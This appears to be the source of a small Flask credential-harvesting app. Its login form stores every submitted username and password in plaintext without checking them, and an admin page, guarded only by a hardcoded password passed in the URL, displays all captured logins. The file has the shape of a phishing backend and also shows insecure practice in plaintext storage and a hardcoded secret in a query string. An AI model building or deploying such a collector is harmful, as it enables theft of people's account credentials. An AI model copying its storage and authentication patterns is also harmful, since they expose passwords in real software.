from flask import Flask, render_template, request, redirect, url_for
import sqlite3

app = Flask(__name__)

# Create the database table
def init_db():
    conn = sqlite3.connect("logins.db")
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Save to DB
        conn = sqlite3.connect("logins.db")
        c = conn.cursor()
        c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()

        return redirect("/")

    return render_template("index.html")


# 🔐 ADMIN PAGE
@app.route("/admin")
def admin():
    # Set your secret admin password here
    secret = request.args.get("password")
    if secret != "neeladmin123":  # You can change this
        return "Access Denied", 403

    conn = sqlite3.connect("logins.db")
    c = conn.cursor()
    c.execute("SELECT username, password FROM logins")
    data = c.fetchall()
    conn.close()

    return render_template("admin.html", data=data)
